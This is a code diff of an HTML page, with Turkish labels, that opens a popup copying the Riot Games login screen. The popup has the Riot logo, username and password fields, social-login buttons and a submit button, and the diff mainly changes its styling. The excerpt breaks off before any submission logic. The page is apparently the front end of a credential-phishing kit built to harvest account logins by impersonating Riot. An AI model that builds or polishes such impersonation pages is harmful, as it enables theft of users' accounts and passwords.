@@ -5,9 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Riot Games</title>
 </head>
-<body>
+<body style="margin: 0; background: #f9f9f9; display: flex; justify-content: flex-start; align-items: flex-start; padding: 20px;">
 
-    <button onclick="openAuth()" style="padding: 15px 30px; background: #ff4655; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">
+    <button onclick="openAuth()" style="padding: 12px 24px; background: #ff4655; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 900; font-family: 'Inter', sans-serif; font-size: 13px; letter-spacing: 0.5px;">
         OTURUM AÇ
     </button>
 
@@ -15,40 +15,58 @@
         function openAuth() {
             const w = 550, h = 800;
             const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
-            let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
+            let win = window.open("", "RiotLogin", "width=" + w + ",height=" + h + ",top=" + t + ",left=" + l);
             
-            // Alt taraftaki kod tek parça halinde pencereye yazılır
-            const popupContent = `
+            // Pop-up içeriğini string olarak hazırlıyoruz
+            const html = `
                 <html>
                 <head>
                     <title>Riot Games - Oturum Aç</title>
                     <style>
-                        @import url('[https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap](https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap)');
-                        body { 
-                            margin:0; height:100vh; overflow:hidden;
-                            background: url('login_bg.jpg') center/cover; 
-                            display:flex; justify-content:center; align-items:center; 
-                            font-family:'Inter', sans-serif; 
-                        }
-                        .card { 
-                            background:#fff; width:330px; padding:45px 35px; 
-                            border-radius:4px; text-align:center; 
-                            box-shadow: 0 10px 50px rgba(0,0,0,0.5);
-                            display: flex; flex-direction: column; align-items: center;
-                            min-height: 520px; justify-content: center;
-                        }
+                        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
+                        body { margin:0; height:100vh; overflow:hidden; background: #111; display:flex; justify-content:center; align-items:center; font-family:'Inter', sans-serif; }
+                        .card { background:#fff; width:330px; padding:45px 35px; border-radius:4px; text-align:center; box-shadow: 0 10px 50px rgba(0,0,0,0.5); display: flex; flex-direction: column; align-items: center; min-height: 520px; justify-content: center; }
                         h2 { font-weight:900; font-size:24px; margin-bottom: 25px; text-transform:uppercase; color:#111; letter-spacing:-1px; }
-                        
                         .input-group { width: 100%; }
                         .input-container { position: relative; margin: 10px 0; width: 100%; text-align: left; }
-                        
-                        input { 
-                            width:100%; padding: 24px 16px 8px 16px; 
-                            background:#f2f2f2; border:2px solid transparent; 
-                            border-radius:4px; box-sizing:border-box; 
-                            font-weight:700; font-size:14px; color:#111; 
-                            outline:none; transition: 0.15s ease-in-out;
-                        }
-                        .label {
-                            position: absolute; left: 16px; top: 18px;
-                            color: #999; font-weight:
+                        input { width:100%; padding: 24px 16px 8px 16px; background:#f2f2f2; border:2px solid transparent; border-radius:4px; box-sizing:border-box; font-weight:700; font-size:14px; color:#111; outline:none; transition: 0.15s ease-in-out; }
+                        .label { position: absolute; left: 16px; top: 18px; color: #999; font-weight: 800; font-size: 11px; text-transform: uppercase; pointer-events: none; transition: 0.15s ease-in-out; }
+                        input:focus { background: #fff; border-color: #111; }
+                        input:focus + .label, input:not(:placeholder-shown) + .label { top: 8px; font-size: 9px; color: #333; }
+                        .loader { display: none; border: 4px solid #f3f3f3; border-top: 4px solid #ff4655; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+                        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+                        .loading-text { display: none; font-size: 12px; font-weight: 800; color: #111; margin-top: 15px; text-transform: uppercase; }
+                        .social-grid { display:grid; grid-template-columns:repeat(5, 1fr); gap:8px; margin:20px 0; width:100%; }
+                        .social-btn { height:40px; border-radius:4px; display:flex; align-items:center; justify-content:center; cursor:pointer; }
+                        .fb { background:#1877f2; } .gg { background:#fff; border:1px solid #ddd; } .ap { background:#000; } .xb { background:#107c10; } .ps { background:#00439c; }
+                        .social-btn img { width:20px; height:20px; object-fit: contain; }
+                        .submit-container { margin-top:30px; }
+                        .next-btn { width:75px; height:75px; border:2px solid #eee; border-radius:24px; background:#fff; cursor:pointer; display:flex; align-items:center; justify-content:center; transition:0.3s; outline: none; }
+                        .next-btn.active { border-color:#ff4655; }
+                        .next-btn.active svg { fill:#ff4655; }
+                        .next-btn svg { width:30px; fill:#ddd; }
+                    </style>
+                </head>
+                <body>
+                    <div class="card">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" width="50" style="margin-bottom:10px;">
+                        <div id="loginForm" style="width:100%">
+                            <h2>OTURUM AÇ</h2>
+                            <div class="input-group">
+                                <div class="input-container"><input type="text" id="u" placeholder=" "><span class="label">Kullanıcı Adı</span></div>
+                                <div class="input-container"><input type="password" id="p" placeholder=" "><span class="label">Şifre</span></div>
+                            </div>
+                            <div class="social-grid">
+                                <div class="social-btn fb"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png"></div>
+                                <div class="social-btn gg"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png"></div>
+                                <div class="social-btn ap"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"></div>
+                                <div class="social-btn xb"><img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/Xbox_one_logo.svg"></div>
+                                <div class="social-btn ps"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Playstation_logo_colour.svg"></div>
+                            </div>
+                            <div class="submit-container">
+                                <button class="next-btn" id="go">
+                                    <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
+                                </button>
+                            </div>
+                        </div>
+                        <div id="loader"
